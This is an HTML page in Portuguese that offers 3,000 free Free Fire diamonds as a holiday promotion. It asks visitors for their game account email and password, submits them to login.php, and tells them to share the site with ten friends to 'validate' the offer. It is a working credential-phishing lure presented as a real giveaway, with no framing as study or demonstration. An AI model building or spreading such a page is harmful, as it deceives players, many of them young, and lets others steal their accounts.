<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Boas Festas Free Fire 🎄</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Arial, sans-serif;
      background: #e3f2fd;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 10px;
      padding: 25px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      text-align: center;
    }
    h2 { color: #0d47a1; margin-bottom: 15px; }
    p { margin-bottom: 20px; font-size: 16px; }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    button {
      background: #2196f3;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover { background: #1976d2; }
    .note {
      font-size: 13px;
      color: green;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🎁 Receba 3.000 Diamantes de Boas Festas!</h2>
    <p>Faça login com sua conta do Free Fire abaixo para receber.</p>
    <form action="login.php" method="POST">
      <input type="email" name="email" placeholder="E-mail" required>
      <input type="password" name="senha" placeholder="Senha" required>
      <button type="submit">Iniciar Sessão</button>
    </form>
    <p class="note">*Compartilhe este site com 10 amigos para validar a promoção.</p>
  </div>
</body>
</html>